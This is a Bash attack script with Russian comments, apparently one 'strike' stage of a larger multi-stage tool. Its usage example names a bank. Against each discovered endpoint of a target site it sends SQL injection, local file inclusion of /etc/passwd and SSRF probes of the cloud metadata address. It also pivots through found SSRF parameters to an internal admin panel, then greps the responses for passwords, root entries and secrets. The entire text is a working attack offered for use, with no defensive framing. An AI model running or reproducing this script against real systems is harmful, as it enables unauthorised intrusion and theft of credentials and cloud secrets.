#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://bank.com"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
KEY5_DIR="$HOME/.shadow_keys/$DOMAIN/key5_strike"
mkdir -p "$KEY5_DIR"

echo "[КЛЮЧ 5] ⚡ Наношу точный удар..."

# Если Ключ 1 нашёл endpoint'ы, бьём по ним
[ -f "$HOME/.shadow_keys/$DOMAIN/key1_recon/found_endpoints.txt" ] && {
    while read endpoint; do
        echo "  🎯 Бью по $endpoint"

        # SQLi
        curl -sk --max-time 3 "$TARGET$endpoint?id=' OR '1'='1" -o "$KEY5_DIR/sqli_$(echo $endpoint | tr '/' '_').txt" -w "  SQLi: %{http_code}\n" 2>/dev/null

        # LFI
        curl -sk --max-time 3 "$TARGET$endpoint?file=../../etc/passwd" -o "$KEY5_DIR/lfi_$(echo $endpoint | tr '/' '_').txt" -w "  LFI: %{http_code}\n" 2>/dev/null

        # SSRF
        curl -sk --max-time 3 -L "$TARGET$endpoint?url=http://169.254.169.254/latest/meta-data/" -o "$KEY5_DIR/ssrf_$(echo $endpoint | tr '/' '_').txt" -w "  SSRF: %{http_code}\n" 2>/dev/null
    done < "$HOME/.shadow_keys/$DOMAIN/key1_recon/found_endpoints.txt"
}

# Если Ключ 3 нашёл SSRF, пробиваем через него
[ -f "$HOME/.shadow_keys/$DOMAIN/key3_gate/ssrf_found.txt" ] && {
    while read line; do
        param=$(echo "$line" | cut -d'|' -f1)
        echo "  🎯 Пробиваю SSRF через $param"
        curl -sk --max-time 3 -L "$TARGET?$param=http://127.0.0.1:8080/admin" -o "$KEY5_DIR/ssrf_attack_$param.txt" -w "  SSRF: %{http_code}\n" 2>/dev/null
    done < "$HOME/.shadow_keys/$DOMAIN/key3_gate/ssrf_found.txt"
}

# Собираем результаты
find "$KEY5_DIR" -name "*.txt" -exec grep -l "root:\|admin\|password\|DB_\|SECRET" {} \; 2>/dev/null | while read f; do
    echo "  💀 ПРОБИТО: $f"
done

echo "[КЛЮЧ 5] ✅ Удар завершён"
echo "[КЛЮЧ 5] 📁 $KEY5_DIR/"
